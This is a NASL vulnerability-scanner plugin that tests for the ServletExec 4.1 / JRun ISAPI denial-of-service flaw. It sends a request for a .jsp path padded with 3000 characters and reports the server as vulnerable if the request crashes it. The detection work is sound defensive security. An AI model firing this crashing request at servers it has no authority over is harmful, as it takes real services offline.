# SPDX-FileCopyrightText: 2002 Matt Moore
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10958");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-0894", "CVE-2000-0681");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ServletExec 4.1 / JRun ISAPI DoS");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Matt Moore");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("JRun/banner");
  script_require_ports("Services/www", 80);
  script_exclude_keys("www/too_long_url_crash");

  script_xref(name:"URL", value:"https://www.westpoint.ltd.uk/advisories/wp-02-0006.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1570");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4796");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/6122");
  script_xref(name:"URL", value:"ftp://ftp.newatlanta.com/public/4_1/patches/");

  script_tag(name:"summary", value:"By sending an overly long request for a .jsp file it is
  possible to crash the remote web server.

  This problem is known as the ServletExec / JRun ISAPI DoS.");

  script_tag(name:"solution", value:"Solution for ServletExec:
  Download patch #9 from the referenced FTP URL.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( http_is_dead( port:port, retry:1 ) )
  exit( 0 );

banner = http_get_remote_headers( port:port );
if( ! banner || "JRun" >!<  banner )
  exit( 0 );

buf = "/" + crap( 3000 ) + ".jsp";

req = http_get( item:buf, port:port );
res = http_send_recv( port:port, data:req );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
}

exit( 99 );
